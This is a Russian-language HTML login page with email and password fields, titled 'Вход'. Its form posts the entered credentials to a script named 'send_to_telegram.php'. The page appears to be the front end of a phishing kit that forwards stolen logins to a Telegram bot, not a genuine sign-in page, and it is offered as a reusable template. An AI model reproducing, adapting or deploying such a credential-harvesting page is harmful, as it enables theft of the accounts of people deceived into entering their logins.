<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход</title>
    <style>
        /* Ваши стили */
    </style>
</head>
<body>
    <div class="login">
        <form class="login-form" action="send_to_telegram.php" method="POST" novalidate="">
            <div class="form-head">
                <div class="form-head__label">Войти</div>
            </div>
            <div class="form-content">
                <div class="form-content__form">
                    <div class="ui-icon-input email-field">
                        <input type="email" name="email" maxlength="254" autocomplete="username" tabindex="1" enterkeyhint="next" placeholder="Введите ваш email" required>
                    </div>
                    <div class="ui-icon-input password-field">
                        <input type="password" name="password" maxlength="50" autocomplete="current-password" tabindex="2" enterkeyhint="enter" placeholder="Введите ваш пароль" required>
                    </div>
                </div>
            </div>
            <div class="form-actions">
                <button type="submit" class="ui-simple-button color-blue size-46">
                    <div class="ui-simple-button__label">Войти</div>
                </button>
            </div>
        </form>
    </div>
</body>
</html>
